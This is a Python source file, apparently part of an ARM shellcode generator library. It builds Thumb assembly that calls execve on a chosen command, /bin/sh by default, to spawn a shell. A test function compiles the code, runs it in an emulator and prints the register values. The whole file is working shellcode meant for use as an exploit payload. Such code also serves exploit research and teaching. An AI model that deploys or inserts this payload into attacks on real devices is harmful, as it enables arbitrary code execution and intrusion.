import syscall

def generate(cmd='/bin/sh'):
    """Executes cmd

    Args:
        cmd(str): executes cmd (default: ``/bin/sh``)
    """
    sc = """
    mov r0, pc
    add r0, #10
    movs r2, #0
    movs r7, #(0+ 11)
    push {r0, r2}
    mov r1, sp
    svc 1
bin_sh_1:
    .asciz "%s\x00"
    """ % (cmd)
    return sc

def testcase(cmd='/bin/sh'):
    import ARMSCGen as scgen
    scgen.prepareCompiler('THUMB')
    sc = scgen.CompileSC(generate(cmd), isThumb=True)
    sclen = sc.find(cmd)
    regs = scgen.UC_TESTSC(sc, sclen, scgen.UC_ARCH_ARM, scgen.UC_MODE_THUMB, False)
    if regs  == -1:
        print "There is no result in emulator"
        return -1

    if len(regs) == 1:
        r0 = regs[0].r0
        r1 = regs[0].r1
        r2 = regs[0].r2
        r7 = regs[0].r7

        print "[+] Register information"
        print "r0: 0x%08x - cmd: %s" % (r0, sc[r0:r0+len(cmd)])
        print "r1: 0x%08x - Stack pointer" % (r1)
        print "r2: 0x%08x - Null" % (r2)
        print "r7: 0x%08x - System call: %s" % (r7, syscall.get(r7))
